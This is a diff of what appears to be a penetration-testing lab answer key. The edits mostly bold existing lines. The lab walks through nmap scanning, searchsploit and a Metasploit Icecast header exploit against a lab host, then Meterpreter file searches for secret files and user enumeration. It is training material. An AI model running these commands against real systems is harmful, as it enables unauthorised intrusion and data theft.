@@ -54,7 +54,7 @@ Report.docx
 
 ## Instructions
 
-You've been provided full access to the network and are getting ping responses from the CEO’s workstation.
+### You've been provided full access to the network and are getting ping responses from the CEO’s workstation.
 
 **Perform a service and version scan using Nmap to determine which services are up and running:**
 
@@ -68,30 +68,30 @@ Answer: `nmap -sV 192.168.0.20`
 
 Answer: `searchsploit icecast`
 
-Now that we know which exploits are available to us, let's start Metasploit:
+**Now that we know which exploits are available to us, let's start Metasploit:**
 
 **Run the command that starts Metasploit:**
 
 Answer: `msfconsole`
 
-Search for the Icecast module and load it for use.
+**Search for the Icecast module and load it for use.**
 
 **Run the command to search for the Icecast module:**
 
 Answer: `search icecast`
 
-Run the command to use the Icecast module:
-Note: Instead of copying the entire path to the module, you can use the number in front of it.
+**Run the command to use the Icecast module:**
+**Note: Instead of copying the entire path to the module, you can use the number in front of it.**
 
 Answer: `use exploit/windows/http/icecast_header`
 
-Set the RHOST to the target machine.
+**Set the RHOST to the target machine.**
 
 **Run the command that sets the RHOST:**
 
 Answer: `set RHOST 192.168.0.20`
 
-Run the Icecast exploit.
+**Run the Icecast exploit.**
 
 **Run the command that runs the Icecast exploit.**
 
@@ -103,7 +103,7 @@ Answer: `search -f *secretfile.txt`
 
 This command will place a wildcard in front of 'secret' in 'secretfile.txt', meanning the search will look for anything that contains 'secretfile.txt' as well as any other text files that have anything before 'secretfile.txt'.
 
-You should now have a Meterpreter session open.
+**You should now have a Meterpreter session open.**
 
 **Run the command to performs a search for the recipe.txt on the target:**
 
@@ -113,9 +113,9 @@ Answer: `search -f *recipe.txt`
 
 Answer:
 
-You can also use Meterpreter's local exploit suggester to find possible exploits.
+**You can also use Meterpreter's local exploit suggester to find possible exploits.**
 
-Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
+**Note: The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.**
 
 ### Bonus
 **A. Run a Meterpreter post script that enumerates all logged on users.**
